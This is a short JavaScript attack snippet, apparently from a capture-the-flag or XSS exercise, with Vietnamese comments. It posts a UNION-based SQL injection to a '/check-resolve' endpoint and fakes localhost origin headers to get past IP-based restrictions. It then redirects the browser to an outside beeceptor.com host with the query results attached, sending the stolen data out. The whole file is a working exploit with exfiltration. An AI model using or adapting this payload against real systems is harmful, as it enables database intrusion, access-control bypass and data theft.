let formData = new URLSearchParams();

// Dùng -1 để dòng đầu tiên bị rỗng, nhường chỗ cho kết quả UNION của chúng ta in ra
// sql là cột chứa câu lệnh CREATE TABLE trong SQLite, nó sẽ lộ hết tên cột!
formData.append('id', '-1 UNION SELECT 1, 2, 3, 4, 5, 6');

fetch('/check-resolve', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1'
    },
    body: formData.toString()
})
.then(response => response.text())
.then(data => {
    window.location = 'https://khanh.free.beeceptor.com/?result=' + encodeURIComponent(data);
});